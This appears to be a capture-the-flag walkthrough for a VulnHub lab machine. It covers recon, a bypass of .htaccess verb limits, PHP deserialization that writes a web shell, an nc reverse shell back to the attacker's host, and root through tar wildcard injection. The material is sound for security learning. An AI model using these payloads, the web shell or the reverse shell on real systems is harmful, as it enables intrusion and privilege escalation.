
<https://www.vulnhub.com/entry/devrandom-pipe,124/>

<https://kishanchoudhary.com/OSWE/php_obj.html>

<https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/>


Keys : .htaccess <Limit></Limit>, php serialization, php destructor, exploiting wildcard, tar Wildcard Injection

# Nmap

	└─$ sudo nmap -sT -A -p- -Pn -sV 192.168.56.4   
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 10:29 CET
	Nmap scan report for 192.168.56.4
	Host is up (0.00055s latency).
	Not shown: 65531 closed tcp ports (conn-refused)
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
	|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
	|   256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
	|_  256 7b:00:f7:dc:31:24:18:cf:e4:0a:ec:7a:32:d9:f6:a2 (ED25519)
	80/tcp    open  http    Apache httpd
	|_http-title: 401 Unauthorized
	| http-auth: 
	| HTTP/1.1 401 Unauthorized\x0D
	|_  Basic realm=index.php
	|_http-server-header: Apache
	111/tcp   open  rpcbind 2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  3,4          111/tcp6  rpcbind
	|   100000  3,4          111/udp6  rpcbind
	|   100024  1          34510/tcp6  status
	|   100024  1          35480/tcp   status
	|   100024  1          40390/udp   status
	|_  100024  1          59138/udp6  status
	35480/tcp open  status  1 (RPC #100024)
	MAC Address: 08:00:27:A2:B4:92 (Oracle VirtualBox virtual NIC)
	Device type: general purpose
	Running: Linux 3.X|4.X
	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
	OS details: Linux 3.2 - 4.9
	Network Distance: 1 hop
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



# Brute force

	$ hydra -l admin  -p darkweb2017-top100.txt  192.168.56.5 http-get


# Scan web directory

## dirsearch

	$ dirsearch -u http://192.168.56.5 -w directory-list-2.3-medium.txt

	Target: http://192.168.56.5/
	                                                                                                                                                                
	[13:58:23] Starting: 
	[13:58:24] 301 -  235B  - /images  ->  http://192.168.56.5/images/                       
	[13:59:02] 301 -  236B  - /scriptz  ->  http://192.168.56.5/scriptz/                           

## wfuzz

	└─$ wfuzz  -c -z file,directory-list-2.3-medium.txt --sc 200 http://192.168.56.5/FUZZ/
	Target: http://192.168.56.5/FUZZ/
	Total requests: 220560http://192.168.56.5

	=====================================================================
	ID           Response   Lines    Word       Chars       Payload                                                                                        
	=====================================================================

	000000016:   200        11 L     26 W       258 Ch      "images"                                                                                       
	000049845:   200        14 L     35 W       392 Ch      "scriptz"                                                                                      


## curl verb

	$ curl -X GET http://192.168.56.5/index.php
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>401 Unauthorized</title>
	</head><body>
	<h1>Unauthorized</h1>
	<p>This server could not verify that you
	are authorized to access the document
	requested.  Either you supplied the wrong
	credentials (e.g., bad password), or your
	browser doesn't understand how to supply
	the credentials required.</p>
	</body></html>
	                                                                                                                                                                
	$ curl -X TEST http://192.168.56.5/index.php

	<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<script src="scriptz/php.js">


Discovery the directory __scriptz__


# Exploit code source log.php.BAK


## Code source

```php
#cat log.php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
        $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
        file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}


// Test
$obj = new Log();
$obj->filename = '/var/www/html/scriptz/shell.php';
$obj->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($obj);
// O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
// Encode as url
// %4f%3a%33%3a%22%4c%6f%67%22%3a%32%3a%7b%73%3a%38%3a%22%66%69%6c%65%6e%61%6d%65%22%3b%73%3a%33%31%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%63%72%69%70%74%7a%2f%73%68%65%6c%6c%2e%70%68%70%22%3b%73%3a%34%3a%22%64%61%74%61%22%3b%73%3a%33%30%3a%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%22%63%6d%64%22%5d%29%3b%20%3f%3e%22%3b%7d

?>

```

## Upload shell

	curl -X POST --data-urlencode 'param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}' http://192.168.56.5/index.php
	curl http://192.168.56.5/scriptz/shell.php?cmd=id
	http://192.168.56.5/scriptz/shell.php?cmd=nc%20192.168.56.1%201234%20-e%20/bin/sh



## Exploit localy 

### crontab

	cat /etc/crontab
	# /etc/crontab: system-wide crontab
	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.

	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	# m h dom mon dow user  command
	17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
	25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	#
	* * * * * root /root/create_backup.sh
	*/5 * * * * root /usr/bin/compress.sh

### script compress

	cat /usr/bin/compress.sh
	#!/bin/sh

	rm -f /home/rene/backup/backup.tar.gz
	cd /home/rene/backup
	tar cfz /home/rene/backup/backup.tar.gz *
	chown rene:rene /home/rene/backup/backup.tar.gz
	rm -f /home/rene/backup/*.BAK


# Get root

## Exploit tar Wildcard Injection

	echo '#!/bin/bash' > script.sh
	echo 'cp /bin/bash /home/rene/backup/bash.sh' >> script.sh
	echo 'chown root.root /home/rene/backup/bash.sh' >> script.sh
	echo 'chmod 4755 /home/rene/backup/bash.sh' >> script.sh

	echo "" > "--checkpoint=1"
	echo "" > "--checkpoint-action=exec=sh script.sh"

## Get root

	ls -al /home/rene/backup/bash.sh
	-rwsr-xr-x 1 root root 1029624 Nov 18 21:15 /home/rene/backup/bash.sh
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	/home/rene/backup/bash.sh -p
	id
	uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
	whoami
	root

# Secret

## Script backup

	cat create_backup.sh
	#!/bin/bash

	head -c $RANDOM /dev/urandom > "/home/rene/backup/sys-$RANDOM.BAK"
	chown rene:rene /home/rene/backup/*.BAK


## HTML directory

	ls -al /var/www/html
	total 36
	drwxr-xr-x 4 www-data www-data 4096 Jul  9  2015 .
	drwxr-xr-x 3 root     root     4096 Jul  5  2015 ..
	-rw-r--r-- 1 www-data www-data  137 Jul  6  2015 .htaccess
	-rw-r--r-- 1 www-data www-data   43 Jul  6  2015 .htpasswd
	drwxr-xr-x 2 www-data www-data 4096 Jul  6  2015 images
	-rw-r--r-- 1 www-data www-data 2801 Jul  9  2015 index.php
	-rw-r--r-- 1 www-data www-data  150 Jul  6  2015 info.php
	-rw-r--r-- 1 www-data www-data  474 Jul  6  2015 log.php
	drwxr-xr-x 2 www-data www-data 4096 Nov 18 19:14 scriptz

## .htaccess file

	cat .htaccess
	AuthUserFile /var/www/html/.htpasswd
	AuthName "index.php"
	AuthType Basic
	<Limit GET PUT HEAD OPTIONS DELETE>
	require valid-user
	</Limit>


Modify .htpasswd

	$ cd /var/www/html
	$ htpasswd .htpasswd rene
	New password: happy
	Re-type new password: happy

